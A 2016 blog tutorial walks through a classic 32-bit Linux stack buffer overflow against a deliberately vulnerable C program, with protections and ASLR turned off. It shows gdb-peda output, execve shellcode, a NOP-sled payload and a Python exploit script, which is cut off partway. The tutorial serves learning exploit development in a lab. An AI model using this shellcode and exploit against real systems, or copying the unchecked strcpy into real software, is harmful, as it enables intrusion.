<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>
        Buffer overflows (Level 1) - Generic title here..
      </title>
    <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport"
    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  
  <meta name="theme-color" content="#000000" />
  
  <meta http-equiv="window-target" content="_top" />
  
  
  <meta name="description" content="What is Smashing the Stack You may have heard the term buffer overflow or smashing the stack but what does this mean? Simply this just means that a program hasnt checked its inputs and important data on the stack has been overwritten (such as a functions return address). Lets have a quick look at what a functions stack frame may look like
3: Arguments 2: local buffer (64 chars) 1: Frame Pointer 0: Return Address  So if the program is vulnerable and doesnt do any bounds checking when writing data into the local buffer then that data can literally overflow the buffer overwriting the values that come after it (such as the return address)." />
  <meta name="generator" content="Hugo 0.59.1 with theme pure" />
  <title>Buffer overflows (Level 1) - Generic title here..</title>
  

  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css">
  <meta property="og:title" content="Buffer overflows (Level 1)" />
<meta property="og:description" content="What is Smashing the Stack You may have heard the term buffer overflow or smashing the stack but what does this mean? Simply this just means that a program hasnt checked its inputs and important data on the stack has been overwritten (such as a functions return address). Lets have a quick look at what a functions stack frame may look like
3: Arguments 2: local buffer (64 chars) 1: Frame Pointer 0: Return Address  So if the program is vulnerable and doesnt do any bounds checking when writing data into the local buffer then that data can literally overflow the buffer overwriting the values that come after it (such as the return address)." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/2016/11/buffer-overflow-level-1/" />
<meta property="article:published_time" content="2016-11-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2016-11-03T00:00:00+00:00" />
<meta itemprop="name" content="Buffer overflows (Level 1)">
<meta itemprop="description" content="What is Smashing the Stack You may have heard the term buffer overflow or smashing the stack but what does this mean? Simply this just means that a program hasnt checked its inputs and important data on the stack has been overwritten (such as a functions return address). Lets have a quick look at what a functions stack frame may look like
3: Arguments 2: local buffer (64 chars) 1: Frame Pointer 0: Return Address  So if the program is vulnerable and doesnt do any bounds checking when writing data into the local buffer then that data can literally overflow the buffer overwriting the values that come after it (such as the return address).">


<meta itemprop="datePublished" content="2016-11-03T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2016-11-03T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="1532">



<meta itemprop="keywords" content="32bit,linux,exploit,bufferoverflow," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Buffer overflows (Level 1)"/>
<meta name="twitter:description" content="What is Smashing the Stack You may have heard the term buffer overflow or smashing the stack but what does this mean? Simply this just means that a program hasnt checked its inputs and important data on the stack has been overwritten (such as a functions return address). Lets have a quick look at what a functions stack frame may look like
3: Arguments 2: local buffer (64 chars) 1: Frame Pointer 0: Return Address  So if the program is vulnerable and doesnt do any bounds checking when writing data into the local buffer then that data can literally overflow the buffer overwriting the values that come after it (such as the return address)."/>

  <!--[if lte IE 9]>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
    <![endif]-->

  <!--[if lt IE 9]>
      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
    <![endif]-->

</head>
  </head>
  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="slimContent">
      <div class="navbar-header">
        <div class="profile-block text-center">
          <a id="avatar" href="https://github.com/mwest67" target="_blank">
            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
          </a>
          <h2 id="name" class="hidden-xs hidden-sm">mwest67</h2>
          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Mike West</h3>
          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Cyberspace</small>
        </div><div class="search" id="search-form-wrap">
    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
                        class="icon icon-search"></i></button>
            </span>
        </div>
        <div class="ins-search">
            <div class="ins-search-mask"></div>
            <div class="ins-search-container">
                <div class="ins-input-wrapper">
                    <input type="text" class="ins-search-input" placeholder="Type something..."
                        x-webkit-speech />
                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
                        aria-label="Close"><span aria-hidden="true">Ã—</span></button>
                </div>
                <div class="ins-section-wrapper">
                    <div class="ins-section-container"></div>
                </div>
            </div>
        </div>
    </form>
</div>
        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>
      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
        <ul class="nav navbar-nav main-nav">
            <li class="menu-item menu-item-home">
                <a href="/">
                    <i class="icon icon-home-fill"></i>
                  <span class="menu-title">Home</span>
                </a>
            </li>
            <li class="menu-item menu-item-archives">
                <a href="/posts">
                    <i class="icon icon-archives-fill"></i>
                  <span class="menu-title">Archives</span>
                </a>
            </li>
            <li class="menu-item menu-item-categories">
                <a href="/categories">
                    <i class="icon icon-folder"></i>
                  <span class="menu-title">Categories</span>
                </a>
            </li>
            <li class="menu-item menu-item-tags">
                <a href="/tags">
                    <i class="icon icon-tags"></i>
                  <span class="menu-title">Tags</span>
                </a>
            </li>
            <li class="menu-item menu-item-about">
                <a href="/about">
                    <i class="icon icon-cup-fill"></i>
                  <span class="menu-title">About</span>
                </a>
            </li>
        </ul>
      </nav>
    </div>
  </header>
  <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      <div class="widget">
    <h3 class="widget-title">Board</h3>
    <div class="widget-body">
        <div id="board">
            <div class="content"><p>enjoy~</p>
            </div>
        </div>
    </div>
</div>

      <div class="widget">
    <h3 class="widget-title"> Categories</h3>
    <div class="widget-body">
        <ul class="category-list">
        </ul>
    </div>
</div>
      <div class="widget">
    <h3 class="widget-title"> Tags</h3>
    <div class="widget-body">
        <ul class="tag-list">
            
            
            <li class="tag-list-item"><a href="/tags/32bit/" class="tag-list-link">32bit</a><span
                    class="tag-list-count">4</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/assembly/" class="tag-list-link">assembly</a><span
                    class="tag-list-count">2</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/bufferoverflow/" class="tag-list-link">bufferoverflow</a><span
                    class="tag-list-count">1</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/exploit/" class="tag-list-link">exploit</a><span
                    class="tag-list-count">2</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/linux/" class="tag-list-link">linux</a><span
                    class="tag-list-count">4</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/shellcode/" class="tag-list-link">shellcode</a><span
                    class="tag-list-count">2</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/slae/" class="tag-list-link">slae</a><span
                    class="tag-list-count">1</span></li>
            
            
            <li class="tag-list-item"><a href="/tags/tools/" class="tag-list-link">tools</a><span
                    class="tag-list-count">1</span></li>
            
        </ul>

    </div>
</div>
      
<div class="widget">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget-body">
        <ul class="recent-post-list list-unstyled no-thumbnail">
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/2017/03/slae-tcp-bind-shell/" class="title">SLAE Tcp Bind Shell</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2017-03-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2017-03-21</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/2016/11/buffer-overflow-level-1/" class="title">Buffer overflows (Level 1)</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2016-11-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016-11-03</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/2016/11/crafting-shellcode/" class="title">Crafting Shellcode</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2016-11-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016-11-02</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/2016/11/format-strings/" class="title">Format Strings</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2016-11-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016-11-01</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/2016/10/using-vagrant/" class="title">Using Vagrant</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2016-10-31 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016-10-31</time>
                    </p>
                </div>
            </li>
        </ul>
    </div>
</div>
  </div>
</aside>

    
    
  <aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
    <div class="slimContent">
      <nav id="toc" class="article-toc">
        <h3 class="toc-title">Catalogue</h3>
        <div class="toc-content always-active"><nav id="TableOfContents">
<ul>
<li><a href="#what-is-smashing-the-stack">What is Smashing the Stack</a></li>
<li><a href="#show-me-the-money">Show me the money!</a></li>
<li><a href="#weaponize-it">Weaponize it!</a></li>
</ul>
</nav>
        </div>
      </nav>
    </div>
  </aside>
<main class="main" role="main"><div class="content">
  <article id="-" class="article article-type-" itemscope
    itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      <h1 itemprop="name">
  <a
    class="article-title"
    href="/2016/11/buffer-overflow-level-1/"
    >Buffer overflows (Level 1)</a
  >
</h1>

      <div class="article-meta">
        <span class="article-date">
  <i class="icon icon-calendar-check"></i>
<a href="/2016/11/buffer-overflow-level-1/" class="article-date">
  <time datetime="2016-11-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016-11-03</time>
</a>
</span>  
  <span class="article-tag">
    <i class="icon icon-tags"></i>
    <a class="article-tag-link" href="/tags/32bit/"> 32bit </a>
    <a class="article-tag-link" href="/tags/linux/"> linux </a>
    <a class="article-tag-link" href="/tags/exploit/"> exploit </a>
    <a class="article-tag-link" href="/tags/bufferoverflow/"> bufferoverflow </a>
  </span>

        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2016/11/buffer-overflow-level-1/#comments"
            class="article-comment-link">Comments</a></span>
		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count:1532words</span>
		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count:8minutes </span>
      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      

<h1 id="what-is-smashing-the-stack">What is Smashing the Stack</h1>

<p>You may have heard the term buffer overflow or smashing the stack but what does
this mean? Simply this just means that a program hasnt checked its inputs and
important data on the stack has been overwritten (such as a functions return
address). Lets have a quick look at what a functions stack frame may look like</p>

<pre><code>3: Arguments
2: local buffer (64 chars)
1: Frame Pointer
0: Return Address
</code></pre>

<p>So if the program is vulnerable and doesnt do any bounds checking when writing
data into the local buffer then that data can literally overflow the buffer
overwriting the values that come after it (such as the return address).</p>

<p>What this means for an attacker is that we have a way to control the flow of the
programs execution, if we can overflow the buffer then we can overwrite the
return address with an address which points to our malicious code and then when
the function returns our code will get executed.</p>

<h1 id="show-me-the-money">Show me the money!</h1>

<p>Right below is a vulnerable C program. (follow along by using the vagrant file I
supplied in my post about vagrant)</p>

<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
  strcpy(buf, argv[<span style="color:#ae81ff">1</span>]);
  puts(buf);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}</code></pre></div>
Lets compile and run</p>

<pre><code>  $ gcc -fno-stack-protector -z execstack -o vuln vuln.c
  $ ./vuln AAAA
  AAAA
</code></pre>

<p>Good all working, notice we have turned off stack protection (stack canaries)
and we have made the stack executable. There is one other protection we want to
disable which is ASLR</p>

<pre><code>  $ sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;
</code></pre>

<p>Now we have a 32bit box circa 2009 ish. lets go break this thing. Fire up the
program in gdb</p>

<pre><code>  $ gdb ./vuln
</code></pre>

<p>First thing we want to do is to find out the size of the buffer that makes the
program crash. Now the good old way was to create patterns with loads of AAAA&rsquo;s
followed by BBBB&rsquo;s etc This was tiresome and tedious so some smart programmer
(longld on github) created <a href="https://github.com/longld/peda">peda</a> which is a gdb
plugin to help with exploit development.</p>

<p>First we&rsquo;ll create a cyclic pattern and set it to an argument</p>

<pre><code>  peda-gdb$ pattern create 100
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
  gdb-peda$ pset arg 'cyclic_pattern(100)'
  gdb-peda$ pshow arg 
  arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
  gdb-peda$ run
   [----------------------------------registers-----------------------------------]
  EAX: 0x0 
  EBX: 0xb7fd1ff4 --&gt; 0x1a0d7c 
  ECX: 0xffffffff 
  EDX: 0xb7fd38b8 --&gt; 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0x65414149 ('IAAe')
  ESP: 0xbffff650 (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
  EIP: 0x41344141 ('AA4A')
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x41344141
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff650 (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
  0004| 0xbffff654 (&quot;fAA5AAKAAgAA6AAL&quot;)
  0008| 0xbffff658 (&quot;AAKAAgAA6AAL&quot;)
  0012| 0xbffff65c (&quot;AgAA6AAL&quot;)
  0016| 0xbffff660 (&quot;6AAL&quot;)
  0020| 0xbffff664 --&gt; 0xbffff600 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
  0024| 0xbffff668 --&gt; 0xbffff6f0 --&gt; 0xbffff893 (&quot;LC_PAPER=en_GB.UTF-8&quot;)
  0028| 0xbffff66c --&gt; 0x0 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x41344141 in ?? ()
  gdb-peda$ 
</code></pre>

<p>As you can see a buffer of 100 chars crashed the program, lets use peda to find
out what exact offset in the buffer caused the crash</p>

<pre><code>  $ gdb-peda$ pattern offset 0x41344141
  1093943617 found at offset: 76
</code></pre>

<p>Whay choose that hex value? well that was the walue of EIP when the program
crashed. We had overflowed the return address and the program tried to jump to
that address, we simply told peda to seacch for that byte pattern in the cyclic
pattern it had created for us ealier. PEDA told us that there are 76 characters
in the buffer before the return address gets overflowed.</p>

<p>Next step is to get us some shellcode and store it in a variable</p>

<pre><code>  gdb-peda$ shellcode generate 
  Available shellcodes:
      x86/bsd bindport
      x86/bsd connect
      x86/bsd exec
      x86/linux bindport
      x86/linux connect
      x86/linux exec

  gdb-peda$ shellcode generate x86/linux exec
  # x86/linux/exec: 24 bytes
  shellcode = (
      &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&quot;
      &quot;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;
  )
  gdb-peda$ python 
  &gt;shellcode = (
  &gt;    &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&quot;
  &gt;    &quot;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;
  &gt;)
  &gt;end
  gdb-peda$ 
</code></pre>

<p>So it turns out peda also has a library of shellcode as well as an interface to
shelstorm.org. What we have done here is to get peda to display the shellcode
for an execve shell (see my shellcode article). We then use peda&rsquo;s python
command to assign this to a python variable.</p>

<p>Lets craft our payload</p>

<pre><code>  gdb-peda$ pset arg '&quot;A&quot; * 76 + &quot;BBBB&quot; + &quot;\x90&quot;*500 + shellcode'
  gdb-peda$ r
   [----------------------------------registers-----------------------------------]
  EAX: 0x0 
  EBX: 0xb7fd1ff4 --&gt; 0x1a0d7c 
  ECX: 0xffffffff 
  EDX: 0xb7fd38b8 --&gt; 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0x41414141 ('AAAA')
  ESP: 0xbffff450 --&gt; 0x90909090 
  EIP: 0x42424242 ('BBBB')
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x42424242
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff450 --&gt; 0x90909090 
  0004| 0xbffff454 --&gt; 0x90909090 
  0008| 0xbffff458 --&gt; 0x90909090 
  0012| 0xbffff45c --&gt; 0x90909090 
  0016| 0xbffff460 --&gt; 0x90909090 
  0020| 0xbffff464 --&gt; 0x90909090 
  0024| 0xbffff468 --&gt; 0x90909090 
  0028| 0xbffff46c --&gt; 0x90909090 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x42424242 in ?? ()
  gdb-peda$ 
</code></pre>

<p>As you can see the program crashed again bit this time EIP points to out B&rsquo;s
(0x42424242). Let me explain the payload string. PEDA allow you to use python
expressions to set the argument that will be passed to the program when gdn runs
it so the payload is broken down as follows
* &ldquo;A&rdquo; * 76     - 76 A&rsquo;s (which we found using pattern offset)
* &ldquo;BBBB&rdquo;       - This will end up being the return address to our shellcode
* &ldquo;0x90&rdquo; * 500 - 500 NOPS which gives us a margin of error with the return
                 address
* shellcode    - Our shellcode string we stored in the variable earlier</p>

<p>Right we currently have one thing left to do, find the address to jump to! When
the program crashed peda displayed a nice view of the stack and it seems to be
filled with our NOPS so we&rsquo;ll pick and address near the bottom and insert it
into our payload</p>

<pre><code>  gdb-peda$ pset arg '&quot;A&quot; * 76 + &quot;\x6c\xf4\xff\xbf&quot; + &quot;\x90&quot;*500 + shellcode'
  gdb-peda$ r
  AAAAAAAAAAAAAAAA........
  process 8331 is executing new program: /bin/dash
  $ 
</code></pre>

<p>Hey presto we have a shell! Why is the address backwards? little endian my
friends! go and google it. One point to note is that peda provides a function
for you to do this so you arg could become</p>

<pre><code>  gdb-peda$ pset arg '&quot;A&quot; * 76 + int2hexstr(0xbffff46c) + &quot;\x90&quot;*500 + shellcode'
</code></pre>

<h1 id="weaponize-it">Weaponize it!</h1>

<p>Lets use peda to weaponize this thing! PEDA has some nifty commands to write
exploit skeletons</p>

<pre><code>  gdb-peda$ skeleton argv exploit.py
  Writing skeleton code to file &quot;exploit.py&quot;
</code></pre>

<p>This has generated the following code</p>

<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># Template for local argv exploit code, generated by PEDA</span>
<span style="color:#75715e">#</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> resource
<span style="color:#f92672">import</span> time

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">usage</span>():
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> target_program&#34;</span> <span style="color:#f92672">%</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>]
    <span style="color:#66d9ef">return</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pattern</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>, start<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
    <span style="color:#66d9ef">try</span>:
        bytes <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;pattern.txt&#34;</span>)<span style="color:#f92672">.</span>read(size<span style="color:#f92672">+</span>start)
        <span style="color:#66d9ef">return</span> bytes[start:]
    <span style="color:#66d9ef">except</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>size

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nops</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>):
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>size

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">int2hexstr</span>(num, intsize<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>):
    <span style="color:#66d9ef">if</span> intsize <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
        <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, num)
        <span style="color:#66d9ef">else</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, num)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;l&#34;</span>, num)
        <span style="color:#66d9ef">else</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, num)
    <span style="color:#66d9ef">return</span> result

i2hs <span style="color:#f92672">=</span> int2hexstr

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(vuln):
    padding <span style="color:#f92672">=</span> pattern(<span style="color:#ae81ff">0</span>)
    payload <span style="color:#f92672">=</span> [padding]
    payload <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;PAYLOAD&#34;</span>] <span style="color:#75715e"># put your payload here</span>
    payload <span style="color:#f92672">=</span> list2hexstr(payload)
    args <span style="color:#f92672">=</span> [vuln, payload]
    env <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PEDA&#34;</span>:nops()}
    resource<span style="color:#f92672">.</span>setrlimit(resource<span style="color:#f92672">.</span>RLIMIT_STACK, (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
    resource<span style="color:#f92672">.</span>setrlimit(resource<span style="color:#f92672">.</span>RLIMIT_CORE, (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
    os<span style="color:#f92672">.</span>execve(vuln, args, env)

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
        usage()
    <span style="color:#66d9ef">else</span>:
        exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])</code></pre></div>
We have to modify this to include our payload from the gdb session, the output
looks like the following</p>

<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># Template for local argv exploit code, generated by PEDA</span>
<span style="color:#75715e">#</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> resource
<span style="color:#f92672">import</span> time

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">usage</span>():
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> target_program&#34;</span> <span style="color:#f92672">%</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>]
    <span style="color:#66d9ef">return</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pattern</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>, start<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
    <span style="color:#66d9ef">try</span>:
        bytes <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;pattern.txt&#34;</span>)<span style="color:#f92672">.</span>read(size<span style="color:#f92672">+</span>start)
        <span style="color:#66d9ef">return</span> bytes[start:]
    <span style="color:#66d9ef">except</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>size

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nops</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>):
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>size

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">int2hexstr</span>(num, intsize<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>):
    <span style="color:#66d9ef">if</span> intsize <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
        <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, num)
        <span style="color:#66d9ef">else</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, num)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;l&#34;</span>, num)
        <span style="color:#66d9ef">else</span>:
            result <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, num)
    <span style="color:#66d9ef">return</span> result

i2hs <span style="color:#f92672">=</span> int2hexstr

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list2hexstr</span>(intlist, intsize<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>):
    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> value <span style="color:#f92672">in</span> intlist:
        <span style="color:#66d9ef">if</span> isinstance(value, str):
            result <span style="color:#f92672">+=</span> value
        <span style="color:#66d9ef">else</span>:
            result <span style="color:#f92672">+=</span> int2hexstr(value, intsize)
    <span style="color:#66d9ef">return</span> result

l2hs <span style="color:#f92672">=</span> list2hexstr

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(vuln):
    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">76</span>
    payload <span style="color:#f92672">=</span> [padding]
 
    shellcode <span style="color:#f92672">=</span> (
       <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31</span><span style="color:#e6db74">&#34;</span>
       <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\x89\xca\x6a\x0b\x58\xcd\x80</span><span style="color:#e6db74">&#34;</span>
    )

    payload <span style="color:#f92672">+=</span> [int2hexstr(<span style="color:#ae81ff">0xbffff46c</span>) <span style="color:#f92672">+</span>  nops(<span style="color:#ae81ff">500</span>) <span style="color:#f92672">+</span> shellcode] <span style="color:#75715e"># put your payload here</span>
    payload <span style="color:#f92672">=</span> list2hexstr(payload)
